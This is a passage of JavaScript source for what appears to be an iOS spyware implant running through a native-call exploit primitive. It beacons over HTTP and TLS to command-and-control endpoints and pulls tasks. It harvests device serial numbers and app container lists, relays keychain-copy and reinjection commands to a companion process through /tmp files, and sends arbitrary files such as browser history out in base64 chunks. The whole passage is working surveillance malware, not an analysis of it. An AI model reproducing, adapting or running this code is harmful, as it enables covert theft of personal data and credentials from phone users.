	var sa = Native.callSymbol("calloc", 1, 16);
	var sab = new ArrayBuffer(16), sv = new DataView(sab);
	sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, port, false);
	var p = host.split(".");
	if (p.length !== 4) {
		Native.callSymbol("free", sa); Native.callSymbol("close", fd); return null;
	}
	sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
	Native.write(sa, sab);
	if (Number(Native.callSymbol("connect", fd, sa, 16)) !== 0) {
		Native.callSymbol("free", sa); Native.callSymbol("close", fd); return null;
	}
	Native.callSymbol("free", sa);
	var req = "POST " + path + " HTTP/1.0\r\nHost: " + _sbHostHeader(ep) +
		"\r\nContent-Type: " + contentType + "\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
	var buf = Native.callSymbol("malloc", req.length + 1);
	Native.writeString(buf, req);
	// Short writes drop /result bodies (History.db chunks) → backend parses {} and silently discards.
	var left = req.length;
	var off = 0;
	while (left > 0) {
		var ptr = (typeof buf === "bigint") ? (buf + BigInt(off)) : (Number(buf) + off);
		var wn = Number(Native.callSymbol("write", fd, ptr, left));
		if (!(wn > 0)) {
			Native.callSymbol("free", buf);
			Native.callSymbol("close", fd);
			return null;
		}
		off += wn;
		left -= wn;
	}
	Native.callSymbol("free", buf);

	var result = "";
	var rbuf = Native.callSymbol("malloc", 16384);
	if (rbuf) {
		// Large payload/get (enc c2_agent ~240KB+): allow up to ~4MiB
		for (var ri = 0; ri < 512; ri++) {
			var n = Number(Native.callSymbol("read", fd, rbuf, 16383));
			if (n <= 0) break;
			result += Native.readString(rbuf, n);
		}
		Native.callSymbol("free", rbuf);
	}
	Native.callSymbol("close", fd);
	var statusLine = result.split("\r\n")[0] || "";
	if (statusLine.indexOf("HTTP/") === 0) {
		var sp = statusLine.split(" ");
		var code = sp.length > 1 ? (+sp[1] || 0) : 0;
		if (code >= 400) return null;
	}
	var idx = result.indexOf("\r\n\r\n");
	if (idx < 0) return {};
	var raw = result.substring(idx + 4);
	if (!raw) return {};
	try { return JSON.parse(raw); } catch (e) { return {}; }
}
function _sbReadPtr(p) {
	try {
		if (typeof Native.read64 === "function") return Native.read64(p);
	} catch (e) {}
	try {
		var b = Native.read(p, 8);
		var u = b instanceof ArrayBuffer ? new Uint8Array(b) : new Uint8Array(b);
		var lo = (u[0] | (u[1] << 8) | (u[2] << 16) | (u[3] << 24)) >>> 0;
		var hi = (u[4] | (u[5] << 8) | (u[6] << 16) | (u[7] << 24)) >>> 0;
		if (typeof BigInt !== "undefined") return BigInt(lo) + (BigInt(hi) << 32n);
		return lo;
	} catch (e2) { return 0; }
}
function _sbPostHttps(ep, path, contentType, body) {
	// CFStream TLS + SNI (aligned with pe_main __peHttpsExchange).
	try {
		var N = Native;
		var kUTF8 = 0x08000100;
		var hostCF = N.callSymbol("CFStringCreateWithCString", 0, _sbEpSni(ep), kUTF8);
		if (!hostCF) return null;
		var readPtr = N.callSymbol("calloc", 1, 8);
		var writePtr = N.callSymbol("calloc", 1, 8);
		N.callSymbol("CFStreamCreatePairWithSocketToHost", 0, hostCF, _sbEpPort(ep) >>> 0, readPtr, writePtr);
		var readStream = _sbReadPtr(readPtr);
		var writeStream = _sbReadPtr(writePtr);
		N.callSymbol("free", readPtr);
		N.callSymbol("free", writePtr);
		if (!readStream || !writeStream) {
			try { N.callSymbol("CFRelease", hostCF); } catch (e0) {}
			return null;
		}
		var keyCB = N.callSymbol("dlsym", -2, "kCFTypeDictionaryKeyCallBacks");
		var valCB = N.callSymbol("dlsym", -2, "kCFTypeDictionaryValueCallBacks");
		var ssl = N.callSymbol("CFDictionaryCreateMutable", 0, 0, keyCB, valCB);
		var kSSL = N.callSymbol("CFStringCreateWithCString", 0, "kCFStreamPropertySSLSettings", kUTF8);
		var kLevel = N.callSymbol("CFStringCreateWithCString", 0, "kCFStreamSSLLevel", kUTF8);
		var kNeg = N.callSymbol("CFStringCreateWithCString", 0, "kCFStreamSocketSecurityLevelNegotiatedSSL", kUTF8);
		var kPeer = N.callSymbol("CFStringCreateWithCString", 0, "kCFStreamSSLPeerName", kUTF8);
		N.callSymbol("CFDictionarySetValue", ssl, kLevel, kNeg);
		N.callSymbol("CFDictionarySetValue", ssl, kPeer, hostCF);
		N.callSymbol("CFReadStreamSetProperty", readStream, kSSL, ssl);
		N.callSymbol("CFWriteStreamSetProperty", writeStream, kSSL, ssl);

		var rl = N.callSymbol("CFRunLoopGetCurrent");
		var modePtr = N.callSymbol("dlsym", -2, "kCFRunLoopDefaultMode");
		var mode = modePtr ? _sbReadPtr(modePtr) : 0;
		if (rl && mode) {
			N.callSymbol("CFReadStreamScheduleWithRunLoop", readStream, rl, mode);
			N.callSymbol("CFWriteStreamScheduleWithRunLoop", writeStream, rl, mode);
		}
		N.callSymbol("CFReadStreamOpen", readStream);
		N.callSymbol("CFWriteStreamOpen", writeStream);
		var opened = false;
		for (var i = 0; i < 50; i++) {
			var rs = Number(N.callSymbol("CFReadStreamGetStatus", readStream));
			var ws = Number(N.callSymbol("CFWriteStreamGetStatus", writeStream));
			if (rs === 7 || ws === 7) break;
			if (rs === 2 && ws === 2) { opened = true; break; }
			if (rl && mode) {
				try { N.callSymbol("CFRunLoopRunInMode", mode, 0.1, 1); } catch (e1) {}
			} else {
				try { N.callSymbol("usleep", 100000); } catch (e2) {}
			}
		}
		if (!opened) {
			try { N.callSymbol("CFReadStreamClose", readStream); } catch (e3) {}
			try { N.callSymbol("CFWriteStreamClose", writeStream); } catch (e4) {}
			try { N.callSymbol("CFRelease", readStream); } catch (e5) {}
			try { N.callSymbol("CFRelease", writeStream); } catch (e6) {}
			try { N.callSymbol("CFRelease", hostCF); } catch (e7) {}
			return null;
		}

		var req = "POST " + path + " HTTP/1.0\r\nHost: " + _sbHostHeader(ep) +
			"\r\nContent-Type: " + contentType + "\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
		var wbuf = N.callSymbol("malloc", req.length + 1);
		N.writeString(wbuf, req);
		var left = req.length, off = 0;
		while (left > 0) {
			var ptr = (typeof wbuf === "bigint") ? (wbuf + BigInt(off)) : (Number(wbuf) + off);
			var wn = Number(N.callSymbol("CFWriteStreamWrite", writeStream, ptr, left));
			if (!(wn > 0)) break;
			off += wn; left -= wn;
		}
		N.callSymbol("free", wbuf);

		var result = "";
		var rbuf = N.callSymbol("malloc", 16384);
		if (rbuf) {
			for (var ri = 0; ri < 512; ri++) {
				var n = Number(N.callSymbol("CFReadStreamRead", readStream, rbuf, 16383));
				if (n > 0) { result += N.readString(rbuf, n); continue; }
				var st = Number(N.callSymbol("CFReadStreamGetStatus", readStream));
				if (st === 5 || st === 7) break;
				if (rl && mode) {
					try { N.callSymbol("CFRunLoopRunInMode", mode, 0.05, 1); } catch (e8) {}
				} else {
					try { N.callSymbol("usleep", 50000); } catch (e9) {}
				}
			}
			N.callSymbol("free", rbuf);
		}
		try { N.callSymbol("CFReadStreamClose", readStream); } catch (e10) {}
		try { N.callSymbol("CFWriteStreamClose", writeStream); } catch (e11) {}
		try { N.callSymbol("CFRelease", readStream); } catch (e12) {}
		try { N.callSymbol("CFRelease", writeStream); } catch (e13) {}
		try { N.callSymbol("CFRelease", hostCF); } catch (e14) {}

		var statusLine = result.split("\r\n")[0] || "";
		if (statusLine.indexOf("HTTP/") === 0) {
			var sp2 = statusLine.split(" ");
			var code2 = sp2.length > 1 ? (+sp2[1] || 0) : 0;
			if (code2 >= 400) return null;
		}
		var idx = result.indexOf("\r\n\r\n");
		if (idx < 0) return {};
		var raw = result.substring(idx + 4);
		if (!raw) return {};
		try { return JSON.parse(raw); } catch (e15) { return {}; }
	} catch (e) {
		return null;
	}
}
function _sbPostEp(ep, path, contentType, body) {
	if (_sbEpScheme(ep) === "https") return _sbPostHttps(ep, path, contentType, body);
	return _sbPostPlain(ep, path, contentType, body);
}
function _sbTryEndpoints(endpoints, path, contentType, body) {
	var list = (endpoints && endpoints.length) ? endpoints : BEACON_ENDPOINTS;
	for (var i = 0; i < list.length; i++) {
		try {
			var r = _sbPostEp(list[i], path, contentType, body);
			if (r != null) return r;
		} catch (e) {}
	}
	return null;
}
// Legacy signature: _sbPost(host, port, path, contentType, body)
// When pack-baked BEACON_ENDPOINTS exist, always failover through them (http/https adaptive).
function _sbPost(host, port, path, contentType, body) {
	if (host && typeof host === "object") {
		return _sbPostEp(host, port, path, contentType);
	}
	try {
		if (typeof BEACON_ENDPOINTS !== "undefined" && BEACON_ENDPOINTS.length) {
			var r = _sbTryEndpoints(BEACON_ENDPOINTS, path, contentType, body);
			if (r != null) return r;
		}
	} catch (e0) {}
	try {
		if (typeof PELOG_ENDPOINTS !== "undefined" && PELOG_ENDPOINTS.length) {
			var r2 = _sbTryEndpoints(PELOG_ENDPOINTS, path, contentType, body);
			if (r2 != null) return r2;
		}
	} catch (e1) {}
	return _sbPostPlain(
		{ scheme: "http", host: String(host), ip: String(host), port: +port },
		path, contentType, body
	);
}

function _labDebugPelogOn() {
	if (typeof PELOG_DUAL_LAB_DEBUG !== "undefined" && !PELOG_DUAL_LAB_DEBUG) return false;
	try {
		var list = (typeof PELOG_ENDPOINTS !== "undefined" && PELOG_ENDPOINTS.length)
			? PELOG_ENDPOINTS
			: ((typeof BEACON_ENDPOINTS !== "undefined") ? BEACON_ENDPOINTS : []);
		for (var i = 0; i < list.length; i++) {
			var ep = list[i];
			var u = String((ep && ep.url) || "");
			var h = String((ep && ep.host) || "");
			var ip = String((ep && ep.ip) || "");
			var port = +(ep && ep.port) || 0;
			if (u.indexOf("192.168.31.32:9090") >= 0) return true;
			if ((ip === "192.168.31.32" || h === "192.168.31.32") && port === 8090) return true;
		}
	} catch (e) {}
	return false;
}

function _c2Log(msg) {
	try {
		var body = "seq=0&msg=" + _enc(msg);
		var list = (typeof PELOG_ENDPOINTS !== "undefined" && PELOG_ENDPOINTS.length)
			? PELOG_ENDPOINTS
			: BEACON_ENDPOINTS;
		if (_labDebugPelogOn() && list && list.length >= 2) {
			try { _sbPostEp(list[0], "/pelog", "application/x-www-form-urlencoded", body); } catch (e0) {}
			try { _sbPostEp(list[1], "/pelog", "application/x-www-form-urlencoded", body); } catch (e1) {}
			return;
		}
		_sbPost(PELOG_HOST, PELOG_PORT, "/pelog", "application/x-www-form-urlencoded", body);
	} catch (e) {}
}

function _opsLog(uid, msg) {
	try {
		var body = "uid=" + _enc(uid || "") + "&msg=" + _enc(String(msg).slice(0, 500));
		_sbPost(BEACON_HOST, BEACON_PORT, "/opslog", "application/x-www-form-urlencoded", body);
	} catch (e) {}
	_c2Log("[OPS] " + msg);
}

function _sendResult(uid, cmdId, obj) {
	try {
		if (obj && obj.status === "failed" && typeof __payloadFallbackReport === "function") {
			try {
				var related = [];
				if (obj.path) related.push(String(obj.path));
				if (obj.mpath) related.push(String(obj.mpath));
				__payloadFallbackReport({
					module_id: obj.module_id || obj.type || obj.role || "bootstrap",
					stage: obj.stage || String(obj.error || "failed").slice(0, 40),
					error: String(obj.error || "failed").slice(0, 500),
					app_id: obj.app_id || obj.bundle_id || "",
					app_version: obj.app_version || "",
					related_paths: related,
					upload_paths: obj.upload_paths || [],
					uid: uid,
					command_id: cmdId,
					meta: { role: obj.role || "bootstrap" }
				});
			} catch (fe) {}
		}
		try {
			if (typeof __outcomeFromExecObj === "function") {
				__outcomeFromExecObj(uid, cmdId, obj);
			} else if (typeof __payloadOutcomeReport === "function" && obj) {
				var st = String(obj.status || "");
				var oc = (st === "failed") ? "fail" : ((st === "success" || st === "completed") ? "success" : st || "partial");
				__payloadOutcomeReport({
					outcome: oc,
					module_id: obj.module_id || obj.role || "bootstrap",
					uid: uid,
					cmd_id: cmdId,
					stage: obj.stage || st,
					error: obj.error || ""
				});
			}
		} catch (oe) {}
		var s = JSON.stringify(obj);
		var body = JSON.stringify({
			command_id: cmdId,
			uuid: uid,
			filename: "exec_result.json",
			data: _strToB64(s)
		});
		_sbPost(BEACON_HOST, BEACON_PORT, "/result", "application/json", body);
	} catch (e) {}
}

function _sendNamedResult(uid, cmdId, filename, obj) {
	try {
		var s = JSON.stringify(obj);
		var body = JSON.stringify({
			command_id: cmdId,
			uuid: uid,
			filename: filename || "result.json",
			data: _strToB64(s)
		});
		_sbPost(BEACON_HOST, BEACON_PORT, "/result", "application/json", body);
	} catch (e) {}
}

function _listAppContainers() {
	var base = "/var/mobile/Containers/Data/Application";
	var d = Native.callSymbol("opendir", base);
	if (!d || d === 0 || d === 0n) return [];
	var out = [];
	for (;;) {
		var ent = Native.callSymbol("readdir", d);
		if (!ent || ent === 0 || ent === 0n) break;
		// Darwin dirent: d_ino(8)+d_seekoff(8)+d_reclen(2)+d_namlen(2)+d_type(1)+d_name
		var name = Native.readString(ent + 21n, 256);
		if (!name || name === "." || name === "..") continue;
		var meta = base + "/" + name + "/.com.apple.mobile_container_manager.metadata.plist";
		var ok = Number(Native.callSymbol("access", meta, 0)) === 0;
		var bundleId = "";
		if (ok) {
			var txt = _fsRead(meta, 8192) || "";
			var xmlKey = "MCMMetadataIdentifier</key>";
			var ki = txt.indexOf(xmlKey);
			if (ki >= 0) {
				var si = txt.indexOf("<string>", ki);
				if (si >= 0) {
					si += 8;
					var ei = txt.indexOf("</string>", si);
					if (ei > si) bundleId = txt.substring(si, ei);
				}
			}
			if (!bundleId) {
				// binary plist: prefer string after MCMMetadataIdentifier
				var marker = "MCMMetadataIdentifier";
				var mi = txt.indexOf(marker);
				var start = mi >= 0 ? mi + marker.length : 0;
				var cur = "", best = "";
				function consider(s) {
					if (!s || s.length < 5 || s.indexOf(".") < 0) return;
					if (s.charAt(0) < "A" || s.charAt(0) > "z") return;
					if (/[^A-Za-z0-9.\-]/.test(s)) return;
					if (s.indexOf("apple.mobile_container") >= 0) return;
					if (s.indexOf("MobileInstallation") >= 0) return;
					if (s === "com.apple.installd" || s === "com.apple.containermanagerd") return;
					if (!best || (mi >= 0 && s.length > 5)) best = s;
				}
				for (var i = start; i < txt.length; i++) {
					var c = txt.charCodeAt(i);
					if (c >= 0x20 && c <= 0x7e) cur += txt.charAt(i);
					else {
						consider(cur);
						if (best && mi >= 0) break;
						cur = "";
					}
				}
				consider(cur);
				bundleId = best;
			}
		}
		out.push({ uuid: name, bundleId: bundleId, hasMetadata: ok });
	}
	try { Native.callSymbol("closedir", d); } catch (e) {}
	return out;
}

function _fsWrite(path, str) {
	var fd = Native.callSymbol("fopen", path, "w");
	if (!fd || fd === 0 || fd === 0n) return false;
	var p = Native.callSymbol("calloc", 1, str.length + 1);
	Native.writeString(p, str);
	Native.callSymbol("fwrite", p, 1, str.length, fd);
	Native.callSymbol("fclose", fd);
	Native.callSymbol("free", p);
	return true;
}

function _fsRead(path, maxLen) {
	var fd = Native.callSymbol("fopen", path, "r");
	if (!fd || fd === 0 || fd === 0n) return null;
	var n = maxLen || 4096;
	var p = Native.callSymbol("calloc", 1, n);
	var got = Native.callSymbol("fread", p, 1, n - 1, fd);
	Native.callSymbol("fclose", fd);
	var s = Native.readString(p, n);
	Native.callSymbol("free", p);
	if (!got || got === 0 || got === 0n) return s || null;
	return s;
}

function _resolveDeviceIds() {
	// Shared with pe / safari_promo: uuid := SerialNumber written to /tmp/c2_ipc/device.json
	try {
		var raw = _fsRead("/tmp/c2_ipc/device.json", 4096);
		if (!raw || raw.length < 8) return null;
		var o = JSON.parse(raw);
		if (o && o.uuid) return o;
	} catch (e) {}
	return null;
}

function _fsWriteDeviceJson(ids) {
	try {
		try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (e) {}
		_fsWrite("/tmp/c2_ipc/device.json", JSON.stringify(ids));
	} catch (e) {}
}

function _sbMgCopyAnswer(key) {
	// Resolve from SpringBoard — pe (mediaplaybackd) must not call this (hangs cold path).
	try {
		var h = Native.callSymbol("dlopen", "/usr/lib/libMobileGestalt.dylib", 1);
		var cf = Native.callSymbol("dlopen", "/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
		if (!h || h === 0 || h === 0n || !cf || cf === 0 || cf === 0n) return "";
		var MG = Native.callSymbol("dlsym", h, "MGCopyAnswer");
		var CFCreate = Native.callSymbol("dlsym", cf, "CFStringCreateWithCString");
		var CFGet = Native.callSymbol("dlsym", cf, "CFStringGetCString");
		var CFRel = Native.callSymbol("dlsym", cf, "CFRelease");
		if (!MG || MG === 0 || MG === 0n || !CFCreate || !CFGet) return "";
		var keyBuf = Native.callSymbol("calloc", 1, String(key).length + 1);
		if (!keyBuf || keyBuf === 0 || keyBuf === 0n) return "";
		Native.writeString(keyBuf, String(key));
		var k = Native.callPtr(CFCreate, 0, keyBuf, 0x08000100);
		try { Native.callSymbol("free", keyBuf); } catch (e) {}
		if (!k || k === 0 || k === 0n) return "";
		var ans = Native.callPtr(MG, k);
		try { if (CFRel) Native.callPtr(CFRel, k); } catch (e) {}
		if (!ans || ans === 0 || ans === 0n) return "";
		var outBuf = Native.callSymbol("calloc", 1, 128);
		var ok = Native.callPtr(CFGet, ans, outBuf, 120, 0x08000100);
		try { if (CFRel) Native.callPtr(CFRel, ans); } catch (e) {}
		var s = "";
		if (ok && ok !== 0 && ok !== 0n) s = Native.readString(outBuf, 120) || "";
		try { Native.callSymbol("free", outBuf); } catch (e) {}
		return s;
	} catch (e) {
		return "";
	}
}

function _ensureDeviceIds() {
	// Upgrade pe_pid placeholder → SerialNumber in SB, then rewrite device.json for pe late-bind.
	var cur = _resolveDeviceIds();
	if (cur && cur.serial && (cur.source === "serial" || cur.source === "unique")) return cur;
	var serial = "";
	var unique = "";
	try { serial = _sbMgCopyAnswer("SerialNumber") || ""; } catch (e) {}
	try { unique = _sbMgCopyAnswer("UniqueDeviceID") || ""; } catch (e) {}
	if (!serial && !unique) return cur;
	var ids = {
		uuid: String(serial || unique),
		serial: String(serial || ""),
		unique: String(unique || ""),
		ts: Date.now(),
		source: serial ? "serial" : "unique"
	};
	_fsWriteDeviceJson(ids);
	return ids;
}

function _fsUnlink(path) {
	try { Native.callSymbol("unlink", path); } catch (e) {}
}

function _dispatchPeServerCmd(uid, c) {
	if (!c || !c.type) return;
	var id = "srv" + (c.id || Date.now());
	if (c.type === "reinject_bootstrap") {
		_c2Log("[C2-STUB] pe_report cmd reinject id=" + id);
		_peIpcRoundtrip(uid, id, "reinject_bootstrap");
	}
}

function _relayPeReport(uid) {
	var raw = _fsRead("/tmp/c2_ipc/pe.status", 8192);
	if (!raw || raw.length < 8) return;
	var pr = null;
	try { pr = JSON.parse(raw); } catch (e) { return; }
	if (!pr || !pr.pe_uid) return;
	try {
		pr.channel = "bs_relay";
		var resp = _sbPost(BEACON_HOST, BEACON_PORT, "/api/pe/report", "application/json", JSON.stringify(pr));
		if (!resp) return;
		var data = (resp.code === 0 && resp.data) ? resp.data : resp;
		if (!data || !data.ok) return;
		_fsWrite("/tmp/c2_ipc/pe.report_ok", String(Date.now()));
		var cmds = data.commands || [];
		for (var i = 0; i < cmds.length; i++) {
			_dispatchPeServerCmd(uid, cmds[i]);
		}
	} catch (e) {
		_c2Log("[C2-STUB] pe_report relay ERR");
	}
}

function _peIpcRoundtrip(uid, cmdId, ctype, extra) {
	extra = extra || {};
	try { Native.callSymbol("mkdir", "/tmp/c2_ipc", 0x1ff); } catch (e) {}
	var id = cmdId || ("ipc" + Date.now());
	var cmdObj = { id: id, type: ctype };
	if (extra && typeof extra === "object") {
		if (extra.path) cmdObj.path = String(extra.path);
		if (extra.max != null) cmdObj.max = Number(extra.max) || 32;
		if (extra.target) cmdObj.target = String(extra.target);
		if (extra.session_id) cmdObj.session_id = String(extra.session_id);
		if (extra.payload) cmdObj.payload = String(extra.payload);
		if (extra.sid) cmdObj.sid = String(extra.sid);
		if (extra.name) cmdObj.name = String(extra.name);
		if (extra.timeout_sec != null) cmdObj.timeout_sec = Number(extra.timeout_sec) || 0;
		if (extra.result_url) cmdObj.result_url = String(extra.result_url);
		// P7 hot path: pe listen reads these from agent.cmd
		if (extra.force) cmdObj.force = true;
		if (extra.skip_keychain) cmdObj.skip_keychain = true;
		if (extra.reason) cmdObj.reason = String(extra.reason);
	}
	if (extra.wait_sec != null) cmdObj.wait_sec = Number(extra.wait_sec) || 30;
	if (extra.max_wait_sec != null) cmdObj.max_wait_sec = Number(extra.max_wait_sec) || 30;
	if (extra.urls) cmdObj.urls = extra.urls;
	if (extra.domains) cmdObj.domains = extra.domains;
	var cmdBody = JSON.stringify(cmdObj);
	_fsUnlink("/tmp/c2_ipc/agent.cmd");
	_fsUnlink("/tmp/c2_ipc/pe.result." + id);
	if (!_fsWrite("/tmp/c2_ipc/agent.cmd", cmdBody)) {
		if (!extra.silent) {
			_sendResult(uid, cmdId, { status: "failed", error: "write agent.cmd failed", role: "bootstrap" });
		}
		return { ok: false, error: "write agent.cmd failed" };
	}
	_c2Log("[C2-STUB] pe_ipc wrote " + ctype + " id=" + id);
	var rpath = "/tmp/c2_ipc/pe.result." + id;
	var body = null;
	// keychain_copy / session_start may block; ensure_bs only waits for pe kick ack (short)
	var maxTries = (ctype === "keychain_copy" || ctype === "session_start") ? 80 : 40;
	if (ctype === "load_module") maxTries = 30;
	if (ctype === "ensure_bs" || ctype === "reinject_bootstrap") {
		// pe answers immediately after kick (nonblock); do not wait full online settle on pe
		var wsec = Number(extra.wait_sec || extra.max_wait_sec || 8);
		if (!(wsec > 0)) wsec = 8;
		if (wsec > 12) wsec = 12;
		maxTries = Math.floor(wsec / 0.5) + 4;
	}
	if (ctype === "safari_promo") maxTries = 120; // scan many DBs
	// P7 Phase2 (RC+decrypt) often >20s; keep pe cold slim — wait aligns with hot p7_warmup
	if (ctype === "p7_warmup" || ctype === "p7_run") {
		var pw = Number(extra.wait_sec || extra.max_wait_sec || 90);
		if (!(pw > 0)) pw = 90;
		if (pw > 180) pw = 180;
		maxTries = Math.floor(pw / 0.5) + 4;
	}
	var p7ExtendLeft = (ctype === "p7_warmup" || ctype === "p7_run") ? 2 : 0;
	for (var i = 0; i < maxTries; i++) {
		body = _fsRead(rpath, 8192);
		if (body && body.length > 0) break;
		// While pe is still in Phase2 it cannot write pe.result yet — extend if progress is fresh
		if (p7ExtendLeft > 0 && i >= maxTries - 2) {
			var prog = _fsRead("/tmp/c2_ipc/pe.p7.progress", 512);
			var fresh = false;
			if (prog && prog.indexOf('"running":true') >= 0) {
				try {
					var po = JSON.parse(prog);
					var pts = Number(po && po.ts) || 0;
					if (pts && (Date.now() - pts) < 300000) fresh = true;
					if (po && po.id && String(po.id) !== String(id)) fresh = false;
				} catch (e) {
					fresh = prog.indexOf('"running":true') >= 0;
				}
			}
			if (fresh) {
				p7ExtendLeft--;
				maxTries += 120; // +60s per extension
				_c2Log("[C2-STUB] pe_ipc p7 wait extend left=" + p7ExtendLeft + " tries=" + maxTries);
			}
		}
		Native.callSymbol("usleep", 500000);
	}
	if (!body) {
		if (!extra.silent) {
			_sendResult(uid, cmdId, { status: "failed", error: "pe result timeout", id: id, role: "bootstrap" });
		}
		return { ok: false, error: "pe result timeout", id: id };
	}
	_fsUnlink(rpath);
	var parsed = null;
	try { parsed = JSON.parse(body); } catch (e) { parsed = { raw: body.slice(0, 200) }; }
	if (!extra.silent) {
		_sendResult(uid, cmdId, { status: "success", result: parsed, role: "bootstrap", pe_ipc: true });
	}
	return { ok: !!(parsed && parsed.ok !== false), result: parsed, id: id };
}

function _readFileChunkBin(path, offset, length) {
	var fd = Native.callSymbol("fopen", path, "r");
	if (!fd || fd === 0 || fd === 0n) return null;
	Native.callSymbol("fseek", fd, offset, 0);
	var p = Native.callSymbol("calloc", 1, length + 8);
	var n = Number(Native.callSymbol("fread", p, 1, length, fd));
	Native.callSymbol("fclose", fd);
	if (!(n > 0)) {
		Native.callSymbol("free", p);
		return "";
	}
	var bin = "";
	var b = new BigUint64Array(nativeCallBuff);
	var base = b[20];
	var left = n;
	var off = 0;
	while (left > 0) {
		var take = left > 2048 ? 2048 : left;
		Native.callSymbol("memcpy", base + 0x1000n, BigInt(p) + BigInt(off), BigInt(take));
		var u = new Uint8Array(nativeCallBuff, 0x1000, take);
		for (var j = 0; j < take; j++) bin += String.fromCharCode(u[j]);
		off += take;
		left -= take;
	}
	Native.callSymbol("free", p);
	return bin;
}

function _exfilFile(uid, cmdId, path, chunkSize, opts) {
	opts = opts || {};
	_opsLog(uid, "exfil start " + path);
	var fd = Native.callSymbol("fopen", path, "r");
	if (!fd || fd === 0 || fd === 0n) {
		if (!opts.silentResult) {
			_sendResult(uid, cmdId, { status: "failed", error: "fopen_fail", path: path, role: "bootstrap" });
		}
		return { ok: false, error: "fopen_fail" };
	}
	Native.callSymbol("fseek", fd, 0, 2);
	var size = Number(Native.callSymbol("ftell", fd));
	Native.callSymbol("fclose", fd);
	if (!(size >= 0)) size = 0;
	var cs = chunkSize || 16384;
	if (cs < 1024) cs = 1024;
	if (cs > 65536) cs = 65536;
	var total = Math.ceil(size / cs) || 1;
	var slash = path.lastIndexOf("/");
	var fname = slash >= 0 ? path.slice(slash + 1) : path;
	if (!fname) fname = "exfil.bin";
	_opsLog(uid, "exfil size=" + size + " chunks=" + total + " file=" + fname);
	for (var idx = 0; idx < total; idx++) {
		var want = size - idx * cs;
		if (want > cs) want = cs;
		if (want < 0) want = 0;
		var bin = _readFileChunkBin(path, idx * cs, want);
		if (bin === null) {
			if (!opts.silentResult) {
				_sendResult(uid, cmdId, { status: "failed", error: "read_fail", offset: idx * cs, role: "bootstrap" });
			}
			return { ok: false, error: "read_fail", offset: idx * cs };
		}
		try {
			var body = JSON.stringify({
				command_id: cmdId,
				uuid: uid,
				filename: fname,
				category: "exfil",
				chunk_index: idx,
				total_chunks: total,
				data: _strToB64(bin)
			});
			var up = _sbPost(BEACON_HOST, BEACON_PORT, "/result", "application/json", body);
			if (up === null) {
				_opsLog(uid, "exfil upload_fail chunk " + (idx + 1) + "/" + total + " " + fname);
				if (!opts.silentResult) {
					_sendResult(uid, cmdId, { status: "failed", error: "upload_fail", offset: idx * cs, role: "bootstrap" });
				}
				return { ok: false, error: "upload_fail", chunk: idx };
			}
		} catch (e) {
			if (!opts.silentResult) {
				_sendResult(uid, cmdId, { status: "failed", error: "upload_fail:" + String(e).slice(0, 80), role: "bootstrap" });
			}
			return { ok: false, error: "upload_fail:" + String(e).slice(0, 80) };
		}
		if (idx === 0 || idx === total - 1 || (idx % 8) === 0) {
			_opsLog(uid, "exfil " + (idx + 1) + "/" + total + " " + fname);
		}
	}
	_opsLog(uid, "exfil done " + fname + " " + size + " bytes");
	// Intermediate exfil must NOT post exec_result.json (that finalizes parent task_pipeline).
	if (!opts.silentResult) {
		_sendResult(uid, cmdId, {
			status: "success",
			result: { ok: true, path: path, filename: fname, size: size, chunks: total, role: "bootstrap", exfil: true }
		});
	}
	return { ok: true, path: path, filename: fname, size: size, chunks: total };
}

function _parseHttpUrl(full) {
	var out = { host: BEACON_HOST, port: BEACON_PORT, path: "/result", ok: false };
	try {
		var s = String(full || "");
		var idx = s.indexOf("://");
		if (idx < 0) {
			out.path = s.charAt(0) === "/" ? s : ("/" + s);
			out.ok = true;
			return out;
		}
		var rest = s.slice(idx + 3);
		var slash = rest.indexOf("/");
		var hp = slash >= 0 ? rest.slice(0, slash) : rest;
		out.path = slash >= 0 ? rest.slice(slash) : "/";
		var colon = hp.indexOf(":");
		if (colon >= 0) {
			out.host = hp.slice(0, colon);
			out.port = +hp.slice(colon + 1) || 80;
		} else {
			out.host = hp;
			out.port = (s.indexOf("https://") === 0) ? 443 : 80;
		}
		out.ok = !!(out.host && out.path);
	} catch (e) {}
	return out;
}

function _taskPull(uid) {
	var body = JSON.stringify({ uid: uid || "", uuid: uid || "" });
	var resp = null;
	try {
		resp = _sbPost(BEACON_HOST, BEACON_PORT, "/api/task/pull", "application/json", body);
	} catch (e) {
		resp = null;
	}
	if (resp && resp.data) return resp.data;
	if (resp && resp.tasks) return resp;
	return null;
}

function _resultUrlsFresh(urls) {
	var nowSec = Math.floor(Date.now() / 1000);
	var ok = [];
	for (var i = 0; i < (urls || []).length; i++) {
		var u = urls[i];
		if (!u || !u.url) continue;
		var exp = Number(u.expires_at || 0);
		if (exp > 0 && nowSec >= exp) continue;
		ok.push(u);
	}
	return ok;
}

function _postToResultUrl(fullUrl, payloadObj) {
	var u = _parseHttpUrl(fullUrl);
	if (!u.ok) return null;
	var body = JSON.stringify(payloadObj);
	try {
		return _sbPost(u.host, u.port, u.path, "application/json", body);
	} catch (e) {
		return null;
	}
}

function _probeResultUrl(fullUrl) {
	var u = _parseHttpUrl(fullUrl);
	if (!u.ok) return false;
	try {
		// Prefer lightweight health on primary C2; avoid fake /result rows that get dropped.
		if (u.host === BEACON_HOST && u.port === BEACON_PORT) {
			var hr = _sbPost(u.host, u.port, "/api/health", "application/json", "{}");
			if (hr !== null) return true;
		}
		var probe = {
			command_id: "probe-" + Date.now().toString(16),
			uuid: "probe",
			filename: "url_probe.json",
			category: "probe",
			data: _strToB64("{}")
		};
		var r = _sbPost(u.host, u.port, u.path, "application/json", JSON.stringify(probe));
		return r !== null;
	} catch (e) {
		return false;
	}
}

function _refreshResultUrls(uid, state) {
	var pull = _taskPull(uid);
	if (!pull) return state;
	state.pull_id = pull.pull_id || state.pull_id;
	state.result_urls = pull.result_urls || [];
	state.settings = pull.settings || state.settings;
	state.refresh_after_ms = (Number((state.settings || {}).resultUrlRefreshOnFailSec) || 120) * 1000;
	state.last_refresh_ts = Date.now();
	return state;
}

function _uploadWithResultUrls(uid, cmdId, path, state, chunkSize) {
	state = state || { result_urls: [], settings: {}, pull_id: "", start_url: "" };
	var fresh = _resultUrlsFresh(state.result_urls);
	if (!fresh.length) {
		state = _refreshResultUrls(uid, state);
